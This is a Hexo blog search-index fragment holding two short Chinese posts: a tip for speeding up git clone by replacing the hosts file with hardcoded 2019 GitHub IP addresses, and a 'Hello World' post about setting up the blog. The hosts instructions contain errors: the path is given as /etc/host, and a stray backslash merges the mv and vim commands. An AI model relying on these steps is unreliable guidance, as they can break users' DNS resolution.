    <entry>
      <title>如何提高Git Clone的速度</title>
      <link href="/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/"/>
      <url>/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<ol><li><p>用ssh</p></li><li><p>改host</p></li></ol><p>Linux下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/host /etc/host_bak \</span><br><span class="line">vim /etc/host</span><br></pre></td></tr></table></figure><p>下面这些丢进去<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Github</span><br><span class="line">151.101.44.249 github.global.ssl.fastly.net</span><br><span class="line">192.30.253.113 github.com</span><br><span class="line"># The follow 3 line may cause Github access slowly</span><br><span class="line"># 103.245.222.133 assets-cdn.github.com</span><br><span class="line"># 23.235.47.133 assets-cdn.github.com</span><br><span class="line"># 203.208.39.104 assets-cdn.github.com</span><br><span class="line"># -------------------------------------------</span><br><span class="line">204.232.175.78 documentcloud.github.com</span><br><span class="line">204.232.175.94 gist.github.com</span><br><span class="line">107.21.116.220 help.github.com</span><br><span class="line">207.97.227.252 nodeload.github.com</span><br><span class="line">199.27.76.130 raw.github.com</span><br><span class="line">107.22.3.110 status.github.com</span><br><span class="line">204.232.175.78 training.github.com</span><br><span class="line">207.97.227.243 www.github.com</span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br><span class="line">185.31.18.133 avatars0.githubusercontent.com</span><br><span class="line">185.31.19.133 avatars1.githubusercontent.com</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure></p><p>ok，速度拉满</p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/01/15/hello-world/"/>
      <url>/2019/01/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my blog!</p><h1 id="修修改改博客终于搞起来了"><a href="#修修改改博客终于搞起来了" class="headerlink" title="修修改改博客终于搞起来了"></a>修修改改博客终于搞起来了</h1><p>从WordPress到hexo再到github+hexo</p><p>然后换了三五个主题</p><p>最终决定用这个仙人掌, 非常合我口味</p><p>同时也安利一下 <a href="https://probberechts.github.io/hexo-theme-cactus/">https://probberechts.github.io/hexo-theme-cactus/</a></p><p>404页面的小恐龙用的是这个 <a href="https://github.com/wayou/t-rex-runner">https://github.com/wayou/t-rex-runner</a></p><p>有时间准备给about me写个好看的js</p><p>然后emmmmmmmmmmmm</p><p>想试试把NES.css结合进来, 八像素风格真好看233</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
